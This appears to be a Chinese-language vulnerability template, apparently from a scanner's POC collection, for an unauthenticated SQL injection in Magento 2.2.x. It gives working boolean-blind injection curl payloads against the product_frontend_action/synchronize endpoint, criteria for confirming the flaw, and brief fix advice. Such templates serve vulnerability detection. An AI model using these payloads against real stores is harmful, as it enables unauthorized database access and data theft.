---
id: MAGENTO-2.2-SQLI
title: Magento 2.2 SQL注入漏洞
product: magento
vendor: Magento
version_affected: "2.2.x"
severity: HIGH
tags: [sqli, 无需认证]
fingerprint: ["Magento"]
---

## 漏洞描述

Magento 2.2.x 版本的 prepareSqlCondition 函数存在二次格式化字符串 bug，导致 SQL 注入漏洞。攻击者可以执行 SQL 盲注获取敏感数据。

## 影响版本

- Magento 2.2.x

## 前置条件

- 无需认证
- 需要能够访问 product frontend action 接口

## 利用步骤

1. 发送带有注入 payload 的请求到 catalog/product_frontend_action/synchronize

## Payload

```bash
# SQL 布尔盲注测试
curl "http://target:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-"

curl "http://target:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-"
```

## 验证方法

```bash
# 按 ## Payload 发两条只差 1=1 / 1=0 的请求，比较响应体
curl -s "http://target:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-"
curl -s "http://target:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-"
# 判据：真条件返回的商品 JSON 列表（含 entity_id / name 字段）与假条件不同 ——
#      或真条件返回商品条目、假条件返回空列表；差异必须只随条件真假变化，重复请求稳定复现
# 反例：两条响应体完全一致，或都返回同一个报错页 HTML → 不能判定注入成立
```

## 修复建议

1. 升级 Magento 至最新版本
2. 对用户输入进行严格过滤
3. 使用 WAF 防护 SQL 注入
